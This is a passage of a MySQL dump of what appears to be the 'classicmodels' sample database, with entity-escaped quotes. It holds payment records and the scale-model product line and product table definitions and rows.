\u0026#39;NR631421\u0026#39;, \u0026#39;2014-05-30\u0026#39;, \u0026#39;31102.85\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;333\u0026#39;, \u0026#39;HL209210\u0026#39;, \u0026#39;2013-11-15\u0026#39;, \u0026#39;23936.53\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;333\u0026#39;, \u0026#39;JK479662\u0026#39;, \u0026#39;2013-10-17\u0026#39;, \u0026#39;9821.32\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;333\u0026#39;, \u0026#39;NF959653\u0026#39;, \u0026#39;2015-03-01\u0026#39;, \u0026#39;21432.31\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;334\u0026#39;, \u0026#39;CS435306\u0026#39;, \u0026#39;2015-01-27\u0026#39;, \u0026#39;45785.34\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;334\u0026#39;, \u0026#39;HH517378\u0026#39;, \u0026#39;2013-08-16\u0026#39;, \u0026#39;29716.86\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;334\u0026#39;, \u0026#39;LF737277\u0026#39;, \u0026#39;2014-05-22\u0026#39;, \u0026#39;28394.54\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;339\u0026#39;, \u0026#39;AP286625\u0026#39;, \u0026#39;2014-10-24\u0026#39;, \u0026#39;23333.06\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;339\u0026#39;, \u0026#39;DA98827\u0026#39;, \u0026#39;2013-11-28\u0026#39;, \u0026#39;34606.28\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;344\u0026#39;, \u0026#39;AF246722\u0026#39;, \u0026#39;2013-11-24\u0026#39;, \u0026#39;31428.21\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;344\u0026#39;, \u0026#39;NJ906924\u0026#39;, \u0026#39;2014-04-02\u0026#39;, \u0026#39;15322.93\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;347\u0026#39;, \u0026#39;DG700707\u0026#39;, \u0026#39;2014-01-18\u0026#39;, \u0026#39;21053.69\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;347\u0026#39;, \u0026#39;LG808674\u0026#39;, \u0026#39;2013-10-24\u0026#39;, \u0026#39;20452.50\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;350\u0026#39;, \u0026#39;BQ602907\u0026#39;, \u0026#39;2014-12-11\u0026#39;, \u0026#39;18888.31\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;350\u0026#39;, \u0026#39;CI471510\u0026#39;, \u0026#39;2013-05-25\u0026#39;, \u0026#39;50824.66\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;350\u0026#39;, \u0026#39;OB648482\u0026#39;, \u0026#39;2015-01-29\u0026#39;, \u0026#39;1834.56\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;353\u0026#39;, \u0026#39;CO351193\u0026#39;, \u0026#39;2015-01-10\u0026#39;, \u0026#39;49705.52\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;353\u0026#39;, \u0026#39;ED878227\u0026#39;, \u0026#39;2013-07-21\u0026#39;, \u0026#39;13920.26\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;353\u0026#39;, \u0026#39;GT878649\u0026#39;, \u0026#39;2013-05-21\u0026#39;, \u0026#39;16700.47\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;353\u0026#39;, \u0026#39;HJ618252\u0026#39;, \u0026#39;2015-06-09\u0026#39;, \u0026#39;46656.94\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;357\u0026#39;, \u0026#39;AG240323\u0026#39;, \u0026#39;2013-12-16\u0026#39;, \u0026#39;20220.04\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;357\u0026#39;, \u0026#39;NB291497\u0026#39;, \u0026#39;2014-05-15\u0026#39;, \u0026#39;36442.34\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;362\u0026#39;, \u0026#39;FP170292\u0026#39;, \u0026#39;2014-07-11\u0026#39;, \u0026#39;18473.71\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;362\u0026#39;, \u0026#39;OG208861\u0026#39;, \u0026#39;2014-09-21\u0026#39;, \u0026#39;15059.76\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;363\u0026#39;, \u0026#39;HL575273\u0026#39;, \u0026#39;2014-11-17\u0026#39;, \u0026#39;50799.69\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;363\u0026#39;, \u0026#39;IS232033\u0026#39;, \u0026#39;2013-01-16\u0026#39;, \u0026#39;10223.83\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;363\u0026#39;, \u0026#39;PN238558\u0026#39;, \u0026#39;2013-12-05\u0026#39;, \u0026#39;55425.77\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;379\u0026#39;, \u0026#39;CA762595\u0026#39;, \u0026#39;2015-02-12\u0026#39;, \u0026#39;28322.83\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;379\u0026#39;, \u0026#39;FR499138\u0026#39;, \u0026#39;2013-09-16\u0026#39;, \u0026#39;32680.31\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;379\u0026#39;, \u0026#39;GB890854\u0026#39;, \u0026#39;2014-08-02\u0026#39;, \u0026#39;12530.51\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;381\u0026#39;, \u0026#39;BC726082\u0026#39;, \u0026#39;2014-12-03\u0026#39;, \u0026#39;12081.52\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;381\u0026#39;, \u0026#39;CC475233\u0026#39;, \u0026#39;2013-04-19\u0026#39;, \u0026#39;1627.56\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;381\u0026#39;, \u0026#39;GB117430\u0026#39;, \u0026#39;2015-02-03\u0026#39;, \u0026#39;14379.90\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;381\u0026#39;, \u0026#39;MS154481\u0026#39;, \u0026#39;2013-08-22\u0026#39;, \u0026#39;1128.20\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;382\u0026#39;, \u0026#39;CC871084\u0026#39;, \u0026#39;2013-05-12\u0026#39;, \u0026#39;35826.33\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;382\u0026#39;, \u0026#39;CT821147\u0026#39;, \u0026#39;2014-08-01\u0026#39;, \u0026#39;6419.84\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;382\u0026#39;, \u0026#39;PH29054\u0026#39;, \u0026#39;2014-11-27\u0026#39;, \u0026#39;42813.83\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;385\u0026#39;, \u0026#39;BN347084\u0026#39;, \u0026#39;2013-12-02\u0026#39;, \u0026#39;20644.24\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;385\u0026#39;, \u0026#39;CP804873\u0026#39;, \u0026#39;2014-11-19\u0026#39;, \u0026#39;15822.84\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;385\u0026#39;, \u0026#39;EK785462\u0026#39;, \u0026#39;2013-03-09\u0026#39;, \u0026#39;51001.22\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;386\u0026#39;, \u0026#39;DO106109\u0026#39;, \u0026#39;2013-11-18\u0026#39;, \u0026#39;38524.29\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;386\u0026#39;, \u0026#39;HG438769\u0026#39;, \u0026#39;2014-07-18\u0026#39;, \u0026#39;51619.02\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;398\u0026#39;, \u0026#39;AJ478695\u0026#39;, \u0026#39;2015-02-14\u0026#39;, \u0026#39;33967.73\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;398\u0026#39;, \u0026#39;DO787644\u0026#39;, \u0026#39;2014-06-21\u0026#39;, \u0026#39;22037.91\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;398\u0026#39;, \u0026#39;JPMR4544\u0026#39;, \u0026#39;2015-05-18\u0026#39;, \u0026#39;615.45\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;398\u0026#39;, \u0026#39;KB54275\u0026#39;, \u0026#39;2014-11-29\u0026#39;, \u0026#39;48927.64\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;406\u0026#39;, \u0026#39;BJMPR4545\u0026#39;, \u0026#39;2015-04-23\u0026#39;, \u0026#39;12190.85\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;406\u0026#39;, \u0026#39;HJ217687\u0026#39;, \u0026#39;2014-01-28\u0026#39;, \u0026#39;49165.16\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;406\u0026#39;, \u0026#39;NA197101\u0026#39;, \u0026#39;2014-06-17\u0026#39;, \u0026#39;25080.96\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;412\u0026#39;, \u0026#39;GH197075\u0026#39;, \u0026#39;2014-07-25\u0026#39;, \u0026#39;35034.57\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;412\u0026#39;, \u0026#39;PJ434867\u0026#39;, \u0026#39;2014-04-14\u0026#39;, \u0026#39;31670.37\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;415\u0026#39;, \u0026#39;ER54537\u0026#39;, \u0026#39;2014-09-28\u0026#39;, \u0026#39;31310.09\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;424\u0026#39;, \u0026#39;KF480160\u0026#39;, \u0026#39;2014-12-07\u0026#39;, \u0026#39;25505.98\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;424\u0026#39;, \u0026#39;LM271923\u0026#39;, \u0026#39;2013-04-16\u0026#39;, \u0026#39;21665.98\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;424\u0026#39;, \u0026#39;OA595449\u0026#39;, \u0026#39;2013-10-31\u0026#39;, \u0026#39;22042.37\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;447\u0026#39;, \u0026#39;AO757239\u0026#39;, \u0026#39;2013-09-15\u0026#39;, \u0026#39;6631.36\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;447\u0026#39;, \u0026#39;ER615123\u0026#39;, \u0026#39;2013-06-25\u0026#39;, \u0026#39;17032.29\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;447\u0026#39;, \u0026#39;OU516561\u0026#39;, \u0026#39;2014-12-17\u0026#39;, \u0026#39;26304.13\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;448\u0026#39;, \u0026#39;FS299615\u0026#39;, \u0026#39;2015-04-18\u0026#39;, \u0026#39;27966.54\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;448\u0026#39;, \u0026#39;KR822727\u0026#39;, \u0026#39;2014-09-30\u0026#39;, \u0026#39;48809.90\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;450\u0026#39;, \u0026#39;EF485824\u0026#39;, \u0026#39;2014-06-21\u0026#39;, \u0026#39;59551.38\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;452\u0026#39;, \u0026#39;ED473873\u0026#39;, \u0026#39;2013-11-15\u0026#39;, \u0026#39;27121.90\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;452\u0026#39;, \u0026#39;FN640986\u0026#39;, \u0026#39;2013-11-20\u0026#39;, \u0026#39;15130.97\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;452\u0026#39;, \u0026#39;HG635467\u0026#39;, \u0026#39;2015-05-03\u0026#39;, \u0026#39;8807.12\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;455\u0026#39;, \u0026#39;HA777606\u0026#39;, \u0026#39;2013-12-05\u0026#39;, \u0026#39;38139.18\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;455\u0026#39;, \u0026#39;IR662429\u0026#39;, \u0026#39;2014-05-12\u0026#39;, \u0026#39;32239.47\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;456\u0026#39;, \u0026#39;GJ715659\u0026#39;, \u0026#39;2014-11-13\u0026#39;, \u0026#39;27550.51\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;456\u0026#39;, \u0026#39;MO743231\u0026#39;, \u0026#39;2014-04-30\u0026#39;, \u0026#39;1679.92\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;458\u0026#39;, \u0026#39;DD995006\u0026#39;, \u0026#39;2014-11-15\u0026#39;, \u0026#39;33145.56\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;458\u0026#39;, \u0026#39;NA377824\u0026#39;, \u0026#39;2014-02-06\u0026#39;, \u0026#39;22162.61\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;458\u0026#39;, \u0026#39;OO606861\u0026#39;, \u0026#39;2013-06-13\u0026#39;, \u0026#39;57131.92\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;462\u0026#39;, \u0026#39;ED203908\u0026#39;, \u0026#39;2015-04-15\u0026#39;, \u0026#39;30293.77\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;462\u0026#39;, \u0026#39;GC60330\u0026#39;, \u0026#39;2013-11-08\u0026#39;, \u0026#39;9977.85\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;462\u0026#39;, \u0026#39;PE176846\u0026#39;, \u0026#39;2014-11-27\u0026#39;, \u0026#39;48355.87\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;471\u0026#39;, \u0026#39;AB661578\u0026#39;, \u0026#39;2014-07-28\u0026#39;, \u0026#39;9415.13\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;471\u0026#39;, \u0026#39;CO645196\u0026#39;, \u0026#39;2013-12-10\u0026#39;, \u0026#39;35505.63\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;473\u0026#39;, \u0026#39;LL427009\u0026#39;, \u0026#39;2014-02-17\u0026#39;, \u0026#39;7612.06\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;473\u0026#39;, \u0026#39;PC688499\u0026#39;, \u0026#39;2013-10-27\u0026#39;, \u0026#39;17746.26\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;475\u0026#39;, \u0026#39;JP113227\u0026#39;, \u0026#39;2013-12-09\u0026#39;, \u0026#39;7678.25\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;475\u0026#39;, \u0026#39;PB951268\u0026#39;, \u0026#39;2014-02-13\u0026#39;, \u0026#39;36070.47\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;484\u0026#39;, \u0026#39;GK294076\u0026#39;, \u0026#39;2014-10-26\u0026#39;, \u0026#39;3474.66\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;484\u0026#39;, \u0026#39;JH546765\u0026#39;, \u0026#39;2013-11-29\u0026#39;, \u0026#39;47513.19\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;486\u0026#39;, \u0026#39;BL66528\u0026#39;, \u0026#39;2014-04-14\u0026#39;, \u0026#39;5899.38\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;486\u0026#39;, \u0026#39;HS86661\u0026#39;, \u0026#39;2014-11-23\u0026#39;, \u0026#39;45994.07\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;486\u0026#39;, \u0026#39;JB117768\u0026#39;, \u0026#39;2013-03-20\u0026#39;, \u0026#39;25833.14\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;487\u0026#39;, \u0026#39;AH612904\u0026#39;, \u0026#39;2013-09-28\u0026#39;, \u0026#39;29997.09\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;487\u0026#39;, \u0026#39;PT550181\u0026#39;, \u0026#39;2014-02-28\u0026#39;, \u0026#39;12573.28\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;489\u0026#39;, \u0026#39;OC773849\u0026#39;, \u0026#39;2013-12-04\u0026#39;, \u0026#39;22275.73\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;489\u0026#39;, \u0026#39;PO860906\u0026#39;, \u0026#39;2014-01-31\u0026#39;, \u0026#39;7310.42\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;495\u0026#39;, \u0026#39;BH167026\u0026#39;, \u0026#39;2013-12-26\u0026#39;, \u0026#39;59265.14\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;495\u0026#39;, \u0026#39;FN155234\u0026#39;, \u0026#39;2014-05-14\u0026#39;, \u0026#39;6276.60\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;496\u0026#39;, \u0026#39;EU531600\u0026#39;, \u0026#39;2015-05-25\u0026#39;, \u0026#39;30253.75\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;496\u0026#39;, \u0026#39;MB342426\u0026#39;, \u0026#39;2013-07-16\u0026#39;, \u0026#39;32077.44\u0026#39;); INSERT INTO `payments` VALUES (\u0026#39;496\u0026#39;, \u0026#39;MN89921\u0026#39;, \u0026#39;2014-12-31\u0026#39;, \u0026#39;52166.00\u0026#39;); -- ---------------------------- -- Table structure for `productlines` -- ---------------------------- DROP TABLE IF EXISTS `productlines`; CREATE TABLE `productlines` ( `productLine` varchar(50) NOT NULL, `textDescription` varchar(4000) DEFAULT NULL, `htmlDescription` mediumtext, `image` mediumblob, PRIMARY KEY (`productLine`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8; -- ---------------------------- -- Records of productlines -- ---------------------------- INSERT INTO `productlines` VALUES (\u0026#39;Classic Cars\u0026#39;, \u0026#39;Attention car enthusiasts: Make your wildest car ownership dreams come true. Whether you are looking for classic muscle cars, dream sports cars or movie-inspired miniatures, you will find great choices in this category. These replicas feature superb attention to detail and craftsmanship and offer features such as working steering system, opening forward compartment, opening rear trunk with removable spare wheel, 4-wheel independent spring suspension, and so on. The models range in size from 1:10 to 1:24 scale and include numerous limited edition and several out-of-production vehicles. All models include a certificate of authenticity from their manufacturers and come fully assembled and ready for display in the home or office.\u0026#39;, null, null); INSERT INTO `productlines` VALUES (\u0026#39;Motorcycles\u0026#39;, \u0026#39;Our motorcycles are state of the art replicas of classic as well as contemporary motorcycle legends such as Harley Davidson, Ducati and Vespa. Models contain stunning details such as official logos, rotating wheels, working kickstand, front suspension, gear-shift lever, footbrake lever, and drive chain. Materials used include diecast and plastic. The models range in size from 1:10 to 1:50 scale and include numerous limited edition and several out-of-production vehicles. All models come fully assembled and ready for display in the home or office. Most include a certificate of authenticity.\u0026#39;, null, null); INSERT INTO `productlines` VALUES (\u0026#39;Planes\u0026#39;, \u0026#39;Unique, diecast airplane and helicopter replicas suitable for collections, as well as home, office or classroom decorations. Models contain stunning details such as official logos and insignias, rotating jet engines and propellers, retractable wheels, and so on. Most come fully assembled and with a certificate of authenticity from their manufacturers.\u0026#39;, null, null); INSERT INTO `productlines` VALUES (\u0026#39;Ships\u0026#39;, \u0026#39;The perfect holiday or anniversary gift for executives, clients, friends, and family. These handcrafted model ships are unique, stunning works of art that will be treasured for generations! They come fully assembled and ready for display in the home or office. We guarantee the highest quality, and best value.\u0026#39;, null, null); INSERT INTO `productlines` VALUES (\u0026#39;Trains\u0026#39;, \u0026#39;Model trains are a rewarding hobby for enthusiasts of all ages. Whether you\\\u0026#39;re looking for collectible wooden trains, electric streetcars or locomotives, you\\\u0026#39;ll find a number of great choices for any budget within this category. The interactive aspect of trains makes toy trains perfect for young children. The wooden train sets are ideal for children under the age of 5.\u0026#39;, null, null); INSERT INTO `productlines` VALUES (\u0026#39;Trucks and Buses\u0026#39;, \u0026#39;The Truck and Bus models are realistic replicas of buses and specialized trucks produced from the early 1920s to present. The models range in size from 1:12 to 1:50 scale and include numerous limited edition and several out-of-production vehicles. Materials used include tin, diecast and plastic. All models include a certificate of authenticity from their manufacturers and are a perfect ornament for the home and office.\u0026#39;, null, null); INSERT INTO `productlines` VALUES (\u0026#39;Vintage Cars\u0026#39;, \u0026#39;Our Vintage Car models realistically portray automobiles produced from the early 1900s through the 1940s. Materials used include Bakelite, diecast, plastic and wood. Most of the replicas are in the 1:18 and 1:24 scale sizes, which provide the optimum in detail and accuracy. Prices range from $30.00 up to $180.00 for some special limited edition replicas. All models include a certificate of authenticity from their manufacturers and come fully assembled and ready for display in the home or office.\u0026#39;, null, null); -- ---------------------------- -- Table structure for `products` -- ---------------------------- DROP TABLE IF EXISTS `products`; CREATE TABLE `products` ( `productCode` varchar(15) NOT NULL DEFAULT \u0026#39;\u0026#39; COMMENT \u0026#39;产品代码\u0026#39;, `productName` varchar(70) NOT NULL COMMENT \u0026#39;产品名称\u0026#39;, `productLine` varchar(50) NOT NULL COMMENT \u0026#39;产品线\u0026#39;, `productScale` varchar(10) NOT NULL, `productVendor` varchar(50) NOT NULL, `productDescription` text NOT NULL, `quantityInStock` smallint(6) NOT NULL COMMENT \u0026#39;库存\u0026#39;, `buyPrice` decimal(10,2) NOT NULL COMMENT \u0026#39;价格\u0026#39;, `MSRP` decimal(10,2) NOT NULL COMMENT \u0026#39;建议零售价\u0026#39;, PRIMARY KEY (`productCode`), KEY `productLine` (`productLine`), CONSTRAINT `products_ibfk_1` FOREIGN KEY (`productLine`) REFERENCES `productlines` (`productLine`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8; -- ---------------------------- -- Records of products -- ---------------------------- INSERT INTO `products` VALUES (\u0026#39;S10_1678\u0026#39;, \u0026#39;1969 Harley Davidson Ultimate Chopper\u0026#39;, \u0026#39;Motorcycles\u0026#39;, \u0026#39;1:10\u0026#39;, \u0026#39;Min Lin Diecast\u0026#39;, \u0026#39;This replica features working kickstand, front suspension, gear-shift lever, footbrake lever, drive chain, wheels and steering. All parts are particularly delicate due to their precise scale and require special care and attention.\u0026#39;, \u0026#39;7933\u0026#39;, \u0026#39;48.81\u0026#39;, \u0026#39;95.70\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S10_1949\u0026#39;, \u0026#39;1952 Alpine Renault 1300\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:10\u0026#39;, \u0026#39;Classic Metal Creations\u0026#39;, \u0026#39;Turnable front wheels; steering function; detailed interior; detailed engine; opening hood; opening trunk; opening doors; and detailed chassis.\u0026#39;, \u0026#39;7305\u0026#39;, \u0026#39;98.58\u0026#39;, \u0026#39;214.30\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S10_2016\u0026#39;, \u0026#39;1996 Moto Guzzi 1100i\u0026#39;, \u0026#39;Motorcycles\u0026#39;, \u0026#39;1:10\u0026#39;, \u0026#39;Highway 66 Mini Classics\u0026#39;, \u0026#39;Official Moto Guzzi logos and insignias, saddle bags located on side of motorcycle, detailed engine, working steering, working suspension, two leather seats, luggage rack, dual exhaust pipes, small saddle bag located on handle bars, two-tone paint with chrome accents, superior die-cast detail , rotating wheels , working kick stand, diecast metal with plastic parts and baked enamel finish.\u0026#39;, \u0026#39;6625\u0026#39;, \u0026#39;68.99\u0026#39;, \u0026#39;118.94\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S10_4698\u0026#39;, \u0026#39;2003 Harley-Davidson Eagle Drag Bike\u0026#39;, \u0026#39;Motorcycles\u0026#39;, \u0026#39;1:10\u0026#39;, \u0026#39;Red Start Diecast\u0026#39;, \u0026#39;Model features, official Harley Davidson logos and insignias, detachable rear wheelie bar, heavy diecast metal with resin parts, authentic multi-color tampo-printed graphics, separate engine drive belts, free-turning front fork, rotating tires and rear racing slick, certificate of authenticity, detailed engine, display stand\\r\\n, precision diecast replica, baked enamel finish, 1:10 scale model, removable fender, seat and tank cover piece for displaying the superior detail of the v-twin engine\u0026#39;, \u0026#39;5582\u0026#39;, \u0026#39;91.02\u0026#39;, \u0026#39;193.66\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S10_4757\u0026#39;, \u0026#39;1972 Alfa Romeo GTA\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:10\u0026#39;, \u0026#39;Motor City Art Classics\u0026#39;, \u0026#39;Features include: Turnable front wheels; steering function; detailed interior; detailed engine; opening hood; opening trunk; opening doors; and detailed chassis.\u0026#39;, \u0026#39;3252\u0026#39;, \u0026#39;85.68\u0026#39;, \u0026#39;136.00\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S10_4962\u0026#39;, \u0026#39;1962 LanciaA Delta 16V\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:10\u0026#39;, \u0026#39;Second Gear Diecast\u0026#39;, \u0026#39;Features include: Turnable front wheels; steering function; detailed interior; detailed engine; opening hood; opening trunk; opening doors; and detailed chassis.\u0026#39;, \u0026#39;6791\u0026#39;, \u0026#39;103.42\u0026#39;, \u0026#39;147.74\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S12_1099\u0026#39;, \u0026#39;1968 Ford Mustang\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:12\u0026#39;, \u0026#39;Autoart Studio Design\u0026#39;, \u0026#39;Hood, doors and trunk all open to reveal highly detailed interior features. Steering wheel actually turns the front wheels. Color dark green.\u0026#39;, \u0026#39;68\u0026#39;, \u0026#39;95.34\u0026#39;, \u0026#39;194.57\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S12_1108\u0026#39;, \u0026#39;2001 Ferrari Enzo\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:12\u0026#39;, \u0026#39;Second Gear Diecast\u0026#39;, \u0026#39;Turnable front wheels; steering function; detailed interior; detailed engine; opening hood; opening trunk; opening doors; and detailed chassis.\u0026#39;, \u0026#39;3619\u0026#39;, \u0026#39;95.59\u0026#39;, \u0026#39;207.80\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S12_1666\u0026#39;, \u0026#39;1958 Setra Bus\u0026#39;, \u0026#39;Trucks and Buses\u0026#39;, \u0026#39;1:12\u0026#39;, \u0026#39;Welly Diecast Productions\u0026#39;, \u0026#39;Model features 30 windows, skylights \u0026amp; glare resistant glass, working steering system, original logos\u0026#39;, \u0026#39;1579\u0026#39;, \u0026#39;77.90\u0026#39;, \u0026#39;136.67\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S12_2823\u0026#39;, \u0026#39;2002 Suzuki XREO\u0026#39;, \u0026#39;Motorcycles\u0026#39;, \u0026#39;1:12\u0026#39;, \u0026#39;Unimax Art Galleries\u0026#39;, \u0026#39;Official logos and insignias, saddle bags located on side of motorcycle, detailed engine, working steering, working suspension, two leather seats, luggage rack, dual exhaust pipes, small saddle bag located on handle bars, two-tone paint with chrome accents, superior die-cast detail , rotating wheels , working kick stand, diecast metal with plastic parts and baked enamel finish.\u0026#39;, \u0026#39;9997\u0026#39;, \u0026#39;66.27\u0026#39;, \u0026#39;150.62\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S12_3148\u0026#39;, \u0026#39;1969 Corvair Monza\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Welly Diecast Productions\u0026#39;, \u0026#39;1:18 scale die-cast about 10\\\u0026#34; long doors open, hood opens, trunk opens and wheels roll\u0026#39;, \u0026#39;6906\u0026#39;, \u0026#39;89.14\u0026#39;, \u0026#39;151.08\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S12_3380\u0026#39;, \u0026#39;1968 Dodge Charger\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:12\u0026#39;, \u0026#39;Welly Diecast Productions\u0026#39;, \u0026#39;1:12 scale model of a 1968 Dodge Charger. Hood, doors and trunk all open to reveal highly detailed interior features. Steering wheel actually turns the front wheels. Color black\u0026#39;, \u0026#39;9123\u0026#39;, \u0026#39;75.16\u0026#39;, \u0026#39;117.44\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S12_3891\u0026#39;, \u0026#39;1969 Ford Falcon\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:12\u0026#39;, \u0026#39;Second Gear Diecast\u0026#39;, \u0026#39;Turnable front wheels; steering function; detailed interior; detailed engine; opening hood; opening trunk; opening doors; and detailed chassis.\u0026#39;, \u0026#39;1049\u0026#39;, \u0026#39;83.05\u0026#39;, \u0026#39;173.02\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S12_3990\u0026#39;, \u0026#39;1970 Plymouth Hemi Cuda\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:12\u0026#39;, \u0026#39;Studio M Art Models\u0026#39;, \u0026#39;Very detailed 1970 Plymouth Cuda model in 1:12 scale. The Cuda is generally accepted as one of the fastest original muscle cars from the 1970s. This model is a reproduction of one of the orginal 652 cars built in 1970. Red color.\u0026#39;, \u0026#39;5663\u0026#39;, \u0026#39;31.92\u0026#39;, \u0026#39;79.80\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S12_4473\u0026#39;, \u0026#39;1957 Chevy Pickup\u0026#39;, \u0026#39;Trucks and Buses\u0026#39;, \u0026#39;1:12\u0026#39;, \u0026#39;Exoto Designs\u0026#39;, \u0026#39;1:12 scale die-cast about 20\\\u0026#34; long Hood opens, Rubber wheels\u0026#39;, \u0026#39;6125\u0026#39;, \u0026#39;55.70\u0026#39;, \u0026#39;118.50\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S12_4675\u0026#39;, \u0026#39;1969 Dodge Charger\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:12\u0026#39;, \u0026#39;Welly Diecast Productions\u0026#39;, \u0026#39;Detailed model of the 1969 Dodge Charger. This model includes finely detailed interior and exterior features. Painted in red and white.\u0026#39;, \u0026#39;7323\u0026#39;, \u0026#39;58.73\u0026#39;, \u0026#39;115.16\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S18_1097\u0026#39;, \u0026#39;1940 Ford Pickup Truck\u0026#39;, \u0026#39;Trucks and Buses\u0026#39;, 